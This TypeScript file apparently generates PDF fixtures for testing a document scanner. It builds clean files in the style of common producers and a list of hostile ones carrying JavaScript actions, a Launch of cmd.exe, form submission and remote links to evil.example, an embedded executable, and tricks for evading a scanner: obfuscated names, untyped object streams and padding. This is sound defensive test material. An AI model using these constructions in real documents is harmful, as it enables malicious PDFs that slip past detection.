// Writes PDFs object by object, the way the common producers lay them out, for the DROP-13 corpus. Each producer
// fixture copies the catalog, actions, names, metadata and cross-reference form its producer writes; the content is
// made up. Bodies are Latin-1 strings, so a byte such as `\xae` (the registered sign in Office's producer) is one byte.
import { deflateSync } from "node:zlib";

export interface StreamObj {
  /** The dictionary entries without `<<`, `>>` and `/Length`. */
  dict: string;
  data: string | Uint8Array;
  /** Deflate the data and add `/Filter /FlateDecode`. */
  flate?: boolean;
}
export type PdfObj = string | StreamObj;

export interface PdfSpec {
  version: string;
  /** Object number to body. */
  objects: Record<number, PdfObj>;
  /** Object numbers packed into one object stream (PDF 1.5); only non-stream objects. */
  packed?: number[] | undefined;
  /** A classic table, an xref stream, or a table whose trailer also points at an xref stream (Office's hybrid). */
  xref: "table" | "stream" | "hybrid";
  /** Trailer entries beyond `/Size`. */
  trailer: string;
  /** Bytes between objects, for padding tests. */
  gap?: string;
  /** Leave `/Type /ObjStm` out of the object stream's dictionary: a reader takes it by `/N` and `/First` alone. */
  untyped?: boolean;
  /** Write the object stream's `/First` as a reference to an object holding the count: a reader resolves it. */
  firstRef?: boolean;
  /** Spaces at the end of the object stream's dictionary, to open it out of a scanner's lookback. */
  dictPad?: number;
}

const latin1 = (s: string): Uint8Array => Uint8Array.from(s, (c) => c.charCodeAt(0) & 0xff);

export function concat(parts: Uint8Array[]): Uint8Array {
  const out = new Uint8Array(parts.reduce((n, p) => n + p.length, 0));
  let at = 0;
  for (const p of parts) {
    out.set(p, at);
    at += p.length;
  }
  return out;
}

const streamBytes = (num: number, s: StreamObj): Uint8Array => {
  const raw = typeof s.data === "string" ? latin1(s.data) : s.data;
  const data = s.flate ? new Uint8Array(deflateSync(raw)) : raw;
  const filter = s.flate ? " /Filter /FlateDecode" : "";
  return concat([
    latin1(`${num} 0 obj\n<< ${s.dict}${filter} /Length ${data.length} >>\nstream\n`),
    data,
    latin1("\nendstream\nendobj\n"),
  ]);
};

/** An xref stream row: type, a 4-byte field, a 2-byte field (W [1 4 2]). */
const row = (type: number, field2: number, field3: number) =>
  new Uint8Array([
    type,
    field2 >>> 24,
    (field2 >>> 16) & 255,
    (field2 >>> 8) & 255,
    field2 & 255,
    field3 >>> 8,
    field3 & 255,
  ]);

export function writePdf(spec: PdfSpec): Uint8Array {
  const packed = new Set(spec.packed ?? []);
  const parts: Uint8Array[] = [latin1(`%PDF-${spec.version}\n%\xe2\xe3\xcf\xd3\n`)];
  let at = parts[0]?.length ?? 0;
  const offsets = new Map<number, number>();
  const inStream = new Map<number, [number, number]>();
  const nums = Object.keys(spec.objects).map(Number);
  let next = Math.max(...nums) + 1;
  const push = (num: number, bytes: Uint8Array) => {
    offsets.set(num, at);
    parts.push(bytes);
    at += bytes.length;
    if (spec.gap) {
      const gap = latin1(spec.gap);
      parts.push(gap);
      at += gap.length;
    }
  };
  for (const num of nums) {
    if (packed.has(num)) continue;
    const body = spec.objects[num] as PdfObj;
    push(num, typeof body === "string" ? latin1(`${num} 0 obj\n${body}\nendobj\n`) : streamBytes(num, body));
  }
  if (packed.size > 0) {
    const stm = next++;
    const members = [...packed];
    let header = "";
    let data = "";
    members.forEach((num, i) => {
      header += `${num} ${data.length} `;
      data += `${spec.objects[num] as string}\n`;
      inStream.set(num, [stm, i]);
    });
    const count = spec.firstRef ? next++ : 0;
    const first = count ? `${count} 0 R` : `${header.length}`;
    const pad = " ".repeat(spec.dictPad ?? 0);
    const dict = `${spec.untyped ? "" : "/Type /ObjStm "}/N ${members.length} /First ${first}${pad}`;
    push(stm, streamBytes(stm, { dict, data: header + data, flate: true }));
    if (count) push(count, latin1(`${count} 0 obj\n${header.length}\nendobj\n`));
  }
  const size = next + (spec.xref === "table" ? 0 : 1);
  const entry = (num: number) => {
    const loose = offsets.get(num);
    if (loose !== undefined) return row(1, loose, 0);
    const [stm, index] = inStream.get(num) ?? [0, 0];
    return stm === 0 ? row(0, 0, 65535) : row(2, stm, index);
  };
  let xrefStm = -1;
  if (spec.xref !== "table") {
    const num = next;
    const rows = Array.from({ length: size }, (_, n) => (n === num ? row(1, at, 0) : entry(n)));
    xrefStm = at;
    const dict = `/Type /XRef /Size ${size} /W [1 4 2] ${spec.trailer}`;
    push(num, streamBytes(num, { dict, data: concat(rows), flate: true }));
  }
  if (spec.xref === "stream") {
    parts.push(latin1(`startxref\n${xrefStm}\n%%EOF\n`));
    return concat(parts);
  }
  const start = at;
  let table = `xref\n0 ${size}\n0000000000 65535 f \n`;
  for (let n = 1; n < size; n++) {
    const off = offsets.get(n);
    table += off === undefined ? "0000000000 00000 f \n" : `${String(off).padStart(10, "0")} 00000 n \n`;
  }
  const hybrid = spec.xref === "hybrid" ? ` /XRefStm ${xrefStm}` : "";
  table += `trailer\n<< /Size ${size} ${spec.trailer}${hybrid} >>\nstartxref\n${start}\n%%EOF\n`;
  parts.push(latin1(table));
  return concat(parts);
}

const text = (s: string): StreamObj => ({ dict: "", data: `BT /F1 24 Tf 72 720 Td (${s}) Tj ET`, flate: true });
const XMP =
  '<?xpacket begin="\xef\xbb\xbf" id="W5M0MpCehiHzreSzNTczkc9d"?><x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF ' +
  'xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description rdf:about="" ' +
  'xmlns:pdf="http://ns.adobe.com/pdf/1.3/" xmlns:xmp="http://ns.adobe.com/xap/1.0/"><pdf:Producer>x</pdf:Producer>' +
  '</rdf:Description></rdf:RDF></x:xmpmeta><?xpacket end="w"?>';
const FONT = "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>";

/** pdfTeX with hyperref and `\pdfobjcompresslevel=2`: dictionaries in an object stream, an xref stream. */
export const latexHyperref = (): Uint8Array =>
  writePdf({
    version: "1.5",
    objects: {
      1: "<< /Type /Catalog /Pages 2 0 R /Outlines 8 0 R /Names 9 0 R /PageMode /UseOutlines /OpenAction [ 3 0 R /Fit ] /PageLabels << /Nums [ 0 << /S /D >> ] >> >>",
      2: "<< /Type /Pages /Count 1 /Kids [ 3 0 R ] >>",
      3: "<< /Type /Page /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> /ProcSet [ /PDF /Text ] >> /MediaBox [ 0 0 612 792 ] /Parent 2 0 R /Annots [ 6 0 R 7 0 R ] >>",
      4: text("Hello from pdfTeX"),
      5: "<< /Type /Font /Subtype /Type1 /BaseFont /CMR10 /FirstChar 0 /LastChar 127 /Widths [ 250 ] /FontDescriptor 13 0 R >>",
      6: "<< /Type /Annot /Subtype /Link /Border [ 0 0 1 ] /H /I /C [ 1 0 0 ] /Rect [ 132 705 160 717 ] /A << /S /GoTo /D (section.1) >> >>",
      7: "<< /Type /Annot /Subtype /Link /Border [ 0 0 1 ] /H /I /C [ 0 1 1 ] /Rect [ 132 690 260 702 ] /A << /Type /Action /S /URI /URI (https://www.ctan.org/pkg/hyperref) >> >>",
      8: "<< /Type /Outlines /First 10 0 R /Last 10 0 R /Count -1 >>",
      9: "<< /Dests 11 0 R >>",
      10: "<< /Title (Introduction) /A << /S /GoTo /D (section.1) >> /Parent 8 0 R >>",
      11: "<< /Kids [ 12 0 R ] >>",
      12: "<< /Names [ (Doc-Start) [ 3 0 R /XYZ 132.768 705.06 null ] (section.1) [ 3 0 R /XYZ 132.768 667.198 null ] ] /Limits [ (Doc-Start) (section.1) ] >>",
      13: "<< /Type /FontDescriptor /FontName /CMR10 /Flags 4 /FontBBox [ -40 -250 1009 750 ] /ItalicAngle 0 /StemV 69 >>",
      14: "<< /Producer (pdfTeX-1.40.25) /Creator (LaTeX with hyperref) /CreationDate (D:20240101120000Z) /Trapped /False /PTEX.Fullbanner (This is pdfTeX, Version 3.141592653-2.6-1.40.25 \\(TeX Live 2023\\) kpathsea version 6.3.5) >>",
    },
    packed: [1, 2, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14],
    xref: "stream",
    trailer: "/Root 1 0 R /Info 14 0 R /ID [ <0123456789abcdef0123456789abcdef> <0123456789abcdef0123456789abcdef> ]",
  });

/** Microsoft PowerPoint's Save as PDF: tagged, a ViewerPreferences dictionary, XMP metadata, slide links by /Dest. */
export const powerpoint = (): Uint8Array =>
  writePdf({
    version: "1.7",
    objects: {
      1: "<< /Type /Catalog /Pages 2 0 R /Lang (en-GB) /StructTreeRoot 9 0 R /MarkInfo << /Marked true >> /Metadata 10 0 R /ViewerPreferences 11 0 R >>",
      2: "<< /Type /Pages /Count 2 /Kids [ 3 0 R 5 0 R ] >>",
      3: "<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 7 0 R >> /ExtGState << /GS7 8 0 R >> /ProcSet [ /PDF /Text /ImageB /ImageC /ImageI ] >> /MediaBox [ 0 0 960 540 ] /Contents 4 0 R /Group << /Type /Group /S /Transparency /CS /DeviceRGB >> /Tabs /S /StructParents 0 /Annots [ 12 0 R 13 0 R ] >>",
      4: text("Quarterly review"),
      5: "<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 7 0 R >> >> /MediaBox [ 0 0 960 540 ] /Contents 6 0 R /StructParents 1 >>",
      6: text("Next steps"),
      7: FONT,
      8: "<< /Type /ExtGState /BM /Normal /ca 1 >>",
      9: "<< /Type /StructTreeRoot /RoleMap << /Footnote /Note /Endnote /Note /Textbox /Sect /Header /Sect /Footer /Sect >> /ParentTree << /Nums [ 0 [ ] 1 [ ] ] >> /K [ ] >>",
      10: { dict: "/Type /Metadata /Subtype /XML", data: XMP },
      11: "<< /DisplayDocTitle true >>",
      12: "<< /Subtype /Link /Rect [ 100 100 300 130 ] /BS << /W 0 >> /F 4 /Dest [ 5 0 R /XYZ 0 540 0 ] /StructParent 2 >>",
      13: "<< /Subtype /Link /Rect [ 100 50 300 80 ] /BS << /W 0 >> /F 4 /A << /Type /Action /S /URI /URI (https://www.example.com/) >> /StructParent 3 >>",
      14: "<< /Title (Quarterly review) /Author (A. Presenter) /Creator (\xfe\xff\x00M\x00i\x00c\x00r\x00o\x00s\x00o\x00f\x00t) /CreationDate (D:20240102093000+00'00') /Producer (Microsoft\xae PowerPoint\xae for Microsoft 365) >>",
    },
    xref: "table",
    trailer: "/Root 1 0 R /Info 14 0 R /ID [ <A1B2C3D4E5F60718293A4B5C6D7E8F90> <A1B2C3D4E5F60718293A4B5C6D7E8F90> ]",
  });

/** Microsoft Word's Save as PDF: an outline, TOC links by /GoTo, structure in an object stream, a hybrid xref. */
export const word = (): Uint8Array =>
  writePdf({
    version: "1.7",
    objects: {
      1: "<< /Type /Catalog /Pages 2 0 R /Lang (en-US) /StructTreeRoot 9 0 R /Outlines 10 0 R /MarkInfo << /Marked true >> /Metadata 12 0 R /ViewerPreferences 13 0 R >>",
      2: "<< /Type /Pages /Count 1 /Kids [ 3 0 R ] >>",
      3: "<< /Type /Page /Parent 2 0 R /Resources << /Font << /F1 5 0 R >> >> /MediaBox [ 0 0 612 792 ] /Contents 4 0 R /Annots [ 6 0 R 7 0 R ] /StructParents 0 >>",
      4: text("Report"),
      5: FONT,
      6: "<< /Subtype /Link /Rect [ 72 700 300 712 ] /BS << /W 0 >> /F 4 /A << /Type /Action /S /GoTo /D [ 3 0 R /XYZ 69 720 0 ] >> /StructParent 1 >>",
      7: "<< /Subtype /Link /Rect [ 72 680 300 692 ] /BS << /W 0 >> /F 4 /A << /Type /Action /S /URI /URI (mailto:someone@example.com) >> /StructParent 2 >>",
      9: "<< /Type /StructTreeRoot /RoleMap << /Footnote /Note /Endnote /Note >> /ParentTree 14 0 R /K [ 15 0 R ] >>",
      10: "<< /Type /Outlines /First 11 0 R /Last 11 0 R /Count 1 >>",
      11: "<< /Title (1. Summary) /Parent 10 0 R /Dest [ 3 0 R /XYZ 69 720 0 ] >>",
      12: { dict: "/Type /Metadata /Subtype /XML", data: XMP },
      13: "<< /DisplayDocTitle true >>",
      14: "<< /Nums [ 0 [ 15 0 R ] ] >>",
      15: "<< /P 9 0 R /S /Document /K [ 0 ] /Pg 3 0 R >>",
      16: "<< /Title (Report) /Author (A. Writer) /Producer (Microsoft\xae Word for Microsoft 365) /CreationDate (D:20240103100000+00'00') >>",
    },
    packed: [9, 14, 15],
    xref: "hybrid",
    trailer: "/Root 1 0 R /Info 16 0 R",
  });

/** Keynote through macOS Quartz: PDF 1.3, a classic table, an ICC color space, URI links only. */
export const keynote = (): Uint8Array =>
  writePdf({
    version: "1.3",
    objects: {
      1: "<< /Type /Pages /MediaBox [ 0 0 1024 768 ] /Count 1 /Kids [ 2 0 R ] >>",
      2: "<< /Type /Page /Parent 1 0 R /Resources 4 0 R /Contents 3 0 R /MediaBox [ 0 0 1024 768 ] /Annots [ 7 0 R ] >>",
      3: text("Keynote slide"),
      4: "<< /ProcSet [ /PDF /Text ] /ColorSpace << /Cs1 5 0 R >> /Font << /TT1 6 0 R >> >>",
      5: "[ /ICCBased 8 0 R ]",
      6: FONT,
      7: "<< /Type /Annot /Subtype /Link /Rect [ 10 10 200 40 ] /Border [ 0 0 0 ] /A << /Type /Action /S /URI /URI (https://www.apple.com/keynote/) >> >>",
      8: { dict: "/N 3 /Alternate /DeviceRGB", data: "icc profile bytes", flate: true },
      9: "<< /Type /Catalog /Pages 1 0 R >>",
      10: "<< /Title (Untitled) /Producer (macOS Version 14.2 \\(Build 23C64\\) Quartz PDFContext) /Creator (Keynote) /CreationDate (D:20240104110000Z00'00') /ModDate (D:20240104110000Z00'00') >>",
    },
    xref: "table",
    trailer: "/Root 9 0 R /Info 10 0 R /ID [ <b5d1c0a1e2f3a4b5c6d7e8f9a0b1c2d3> <b5d1c0a1e2f3a4b5c6d7e8f9a0b1c2d3> ]",
  });

/** Google Slides through Skia/PDF: a ViewerPreferences dictionary in the catalog, slide links by /Dest. */
export const googleSlides = (): Uint8Array =>
  writePdf({
    version: "1.4",
    objects: {
      1: "<< /Producer (Skia/PDF m122 Google Docs Renderer) /Title (Team update) >>",
      2: "<< /Type /Catalog /Pages 3 0 R /ViewerPreferences << /Type /ViewerPreferences /DisplayDocTitle true >> >>",
      3: "<< /Type /Pages /Count 2 /Kids [ 4 0 R 6 0 R ] >>",
      4: "<< /Type /Page /Resources << /ProcSet [ /PDF /Text /ImageB /ImageC /ImageI ] /Font << /F4 8 0 R >> >> /MediaBox [ 0 0 720 405 ] /Contents 5 0 R /Parent 3 0 R /Annots [ 9 0 R 10 0 R ] >>",
      5: text("Team update"),
      6: "<< /Type /Page /Resources << /Font << /F4 8 0 R >> >> /MediaBox [ 0 0 720 405 ] /Contents 7 0 R /Parent 3 0 R >>",
      7: text("Slide two"),
      8: FONT,
      9: "<< /Type /Annot /Subtype /Link /F 4 /Border [ 0 0 0 ] /Rect [ 20 20 200 40 ] /Dest [ 6 0 R /XYZ 0 405 0 ] >>",
      10: "<< /Type /Annot /Subtype /Link /F 4 /Border [ 0 0 0 ] /Rect [ 20 50 200 70 ] /A << /Type /Action /S /URI /URI (https://docs.google.com/) >> >>",
    },
    xref: "table",
    trailer: "/Root 2 0 R /Info 1 0 R",
  });

/** Adobe Acrobat: a linearization dictionary, an open action to page one, a page action that goes to a page, a form
 * with no script, object streams and an xref stream. */
export const acrobat = (): Uint8Array =>
  writePdf({
    version: "1.6",
    objects: {
      1: "<< /Linearized 1 /L 12000 /O 4 /E 9000 /N 2 /T 11000 /H [ 600 200 ] >>",
      2: "<< /Type /Catalog /Pages 3 0 R /OpenAction 12 0 R /PageLayout /SinglePage /PageMode /UseNone /AcroForm 9 0 R /Metadata 13 0 R /Names << /Dests 14 0 R >> >>",
      3: "<< /Type /Pages /Count 2 /Kids [ 4 0 R 6 0 R ] >>",
      4: "<< /Type /Page /Parent 3 0 R /Resources << /Font << /Helv 8 0 R >> >> /MediaBox [ 0 0 612 792 ] /Contents 5 0 R /Annots [ 10 0 R ] /AA << /O << /S /GoTo /D [ 4 0 R /Fit ] >> >> >>",
      5: text("Form page"),
      6: "<< /Type /Page /Parent 3 0 R /MediaBox [ 0 0 612 792 ] /Contents 7 0 R /AA << /C << /S /GoTo /D (top) >> >> >>",
      7: text("Second page"),
      8: "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Name /Helv >>",
      9: "<< /Fields [ 10 0 R ] /DA (/Helv 0 Tf 0 g ) /DR << /Font << /Helv 8 0 R >> >> /NeedAppearances false >>",
      10: "<< /Type /Annot /Subtype /Widget /FT /Tx /T (Name) /Rect [ 72 600 300 620 ] /F 4 /P 4 0 R /DA (/Helv 12 Tf 0 g) /MK << >> >>",
      11: "<< /Producer (Adobe Acrobat Pro 24.1.20643) /Creator (Adobe Acrobat Pro 24.1.20643) /ModDate (D:20240105120000Z) >>",
      12: "<< /S /GoTo /D [ 4 0 R /XYZ null null 1 ] >>",
      13: { dict: "/Type /Metadata /Subtype /XML", data: XMP },
      14: "<< /Names [ (top) [ 4 0 R /FitH 792 ] ] >>",
    },
    packed: [2, 3, 8, 9, 10, 11, 12, 14],
    xref: "stream",
    trailer: "/Root 2 0 R /Info 11 0 R",
  });

/** A minimal page tree for the malicious fixtures: catalog extras, page extras, and more objects. */
const malicious = (catalog: string, page = "", more: Record<number, PdfObj> = {}, packed?: number[]) =>
  writePdf({
    version: "1.7",
    objects: {
      1: `<< /Type /Catalog /Pages 2 0 R ${catalog} >>`,
      2: "<< /Type /Pages /Count 1 /Kids [ 3 0 R ] >>",
      3: `<< /Type /Page /Parent 2 0 R /MediaBox [ 0 0 612 792 ] /Contents 4 0 R ${page} >>`,
      4: text("Hello"),
      ...more,
    },
    packed,
    xref: packed ? "stream" : "table",
    trailer: "/Root 1 0 R",
  });

/** What the producers write: each must pass. */
export const CLEAN: [string, () => Uint8Array][] = [
  ["LaTeX hyperref", latexHyperref],
  ["PowerPoint", powerpoint],
  ["Word", word],
  ["Keynote", keynote],
  ["Google Slides", googleSlides],
  ["Acrobat", acrobat],
];

/** Each carries one dangerous action, and must be refused with the name it shows. */
export const HOSTILE: [string, () => Uint8Array, string[]][] = [
  [
    "JS in OpenAction",
    () => malicious("/OpenAction << /S /JavaScript /JS (app.alert\\(1\\)) >>"),
    ["JS", "JavaScript"],
  ],
  [
    "JS in a page AA",
    () =>
      malicious("", "/AA << /O << /S /JavaScript /JS 5 0 R >> >>", {
        5: { dict: "", data: "app.alert(1)" },
      }),
    ["JS", "JavaScript"],
  ],
  [
    "JS in an object stream",
    () => malicious("/OpenAction 5 0 R", "", { 5: "<< /S /JavaScript /JS (app.alert\\(1\\)) >>" }, [1, 2, 3, 5]),
    ["JS", "JavaScript"],
  ],
  [
    "AA with JS in an object stream",
    () => malicious("", "/AA << /C 5 0 R >>", { 5: "<< /S /J#61vaScript /J#53 (x) >>" }, [3, 5]),
    ["JS", "JavaScript"],
  ],
  ["Launch", () => malicious("/OpenAction << /S /Launch /Win << /F (cmd.exe) >> >>"), ["Launch"]],
  [
    "SubmitForm",
    () => malicious("", "/AA << /C << /S /SubmitForm /F << /FS /URL /F (https://evil.example/c) >> >> >>"),
    ["SubmitForm"],
  ],
  [
    "GoToR external",
    () => malicious("/OpenAction << /S /GoToR /F (https://evil.example/x.pdf) /D [ 0 /Fit ] >>"),
    ["GoToR"],
  ],
  ["GoToE", () => malicious("/OpenAction << /S /GoToE /F (other.pdf) /T << /R /C /N (x) >> >>"), ["GoToE"]],
  ["ImportData", () => malicious("/OpenAction << /S /ImportData /F (data.fdf) >>"), ["ImportData"]],
  [
    "RichMedia",
    () => malicious("", "/Annots [ 5 0 R ]", { 5: "<< /Type /Annot /Subtype /RichMedia /Rect [ 0 0 9 9 ] >>" }),
    ["RichMedia"],
  ],
  [
    "a Names-tree script",
    () =>
      malicious("/Names << /JavaScript 5 0 R >>", "", {
        5: "<< /Names [ (x) 6 0 R ] >>",
        6: "<< /S /JavaScript /JS (1) >>",
      }),
    ["JS", "JavaScript"],
  ],
  [
    "an embedded file",
    () => malicious("/Names << /EmbeddedFiles 5 0 R >>", "", { 5: "<< /Names [ ] >>" }),
    ["EmbeddedFiles"],
  ],
  [
    "JS in an object stream with no /Type, which pdf.js still reads",
    () =>
      writePdf({
        version: "1.7",
        objects: {
          1: "<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>",
          2: "<< /Type /Pages /Kids [ 3 0 R ] /Count 1 >>",
          3: "<< /Type /Page /Parent 2 0 R /MediaBox [ 0 0 100 100 ] >>",
          4: "<< /S /JavaScript /JS (app.alert\\(1\\)) >>",
        },
        packed: [4],
        untyped: true,
        xref: "stream",
        trailer: "/Root 1 0 R",
      }),
    ["JS", "JavaScript"],
  ],
  [
    "JS in an untyped object stream whose /First is a reference and whose dictionary opens out of the lookback",
    () =>
      writePdf({
        version: "1.7",
        objects: {
          1: "<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>",
          2: "<< /Type /Pages /Kids [ 3 0 R ] /Count 1 >>",
          3: "<< /Type /Page /Parent 2 0 R /MediaBox [ 0 0 100 100 ] >>",
          4: "<< /S /JavaScript /JS (app.alert\\(1\\)) >>",
        },
        packed: [4],
        untyped: true,
        firstRef: true,
        dictPad: 5000,
        xref: "stream",
        trailer: "/Root 1 0 R",
      }),
    ["unscannable"],
  ],
  [
    "a file attachment annotation carrying an executable",
    () =>
      malicious("", "/Annots [ 5 0 R ]", {
        5: "<< /Type /Annot /Subtype /FileAttachment /Rect [ 10 10 40 40 ] /FS << /Type /Filespec /F (invoice.exe) /UF (invoice.exe) /EF << /F 6 0 R >> >> >>",
        6: { dict: "", data: "MZ fake executable bytes" },
      }),
    ["EF", "FileAttachment"],
  ],
  [
    "a related-files array",
    () => malicious("", "", { 5: "<< /Type /Filespec /F (a.pdf) /RF << /F 6 0 R >> >>", 6: "[ 0 7 0 R ]" }),
    ["RF"],
  ],
];
